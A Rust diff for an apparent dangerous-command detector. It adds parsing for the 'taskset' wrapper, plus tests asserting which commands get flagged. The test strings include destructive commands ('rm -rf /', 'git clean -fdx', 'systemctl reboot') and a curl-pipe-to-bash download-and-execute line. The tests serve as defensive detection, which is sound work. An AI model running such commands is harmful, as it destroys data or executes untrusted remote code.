@@ -1187,6 +1187,79 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "taskset" => {
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut pid_mode = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &["all-tasks", "pid", "cpu-list", "help", "version"],
+                        ) {
+                            Some("all-tasks" | "cpu-list") if attached.is_none() => {
+                                tokens = &tokens[1..]
+                            }
+                            Some("pid") if attached.is_none() => {
+                                pid_mode = true;
+                                tokens = &tokens[1..];
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    let mut terminal = false;
+                    for flag in flags.chars() {
+                        match flag {
+                            'a' | 'c' => {}
+                            'p' => pid_mode = true,
+                            'h' | 'V' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    tokens = &tokens[1..];
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || pid_mode {
+                    // PID mode only queries or updates an existing process;
+                    // its mask/list and PID positionals are not executable.
+                    tokens = &tokens[tokens.len()..];
+                } else if !tokens.is_empty() {
+                    // Command mode owns one affinity mask or CPU-list before
+                    // the direct child argv begins.
+                    tokens = &tokens[1..];
+                }
+            }
             "chroot" => {
                 tokens = &tokens[1..];
                 let mut valid = true;
@@ -3103,6 +3176,44 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "ionice process data or direct argv was treated as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn taskset_pid_mode_does_not_hide_direct_child_dispatch() {
+        for command in [
+            "taskset ff rm -rf /",
+            "taskset -c 0-3 git reset --hard HEAD~1",
+            "taskset -a ff systemctl reboot",
+            "taskset --cpu-list 0 chroot /srv/root rm -rf /",
+            "taskset -- ff git clean -fdx",
+            "busybox taskset ff rm -rf /",
+            "env taskset ffff git clean -fdx",
+            "printf x | xargs taskset ff rm -rf /",
+            "curl https://example.invalid/x | taskset ff bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "taskset -p 99999999 rm -rf /",
+            "taskset --pid 99999999 git reset --hard HEAD~1",
+            "taskset -pc 0-3 99999999 systemctl reboot",
+            "taskset -ap ff 99999999 rm -rf /",
+            "taskset --help rm -rf /",
+            "taskset --version systemctl reboot",
+            "taskset --unknown systemctl reboot",
+            "taskset --pid=x rm -rf /",
+            "taskset -x rm -rf /",
+            "taskset -c0 rm -rf /",
+            "taskset ff command rm -rf /",
+            "taskset ff FOO=1 rm -rf /",
+            "taskset ff eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "taskset PID data or direct argv was treated as a child for {command:?}"
             );
         }
     }
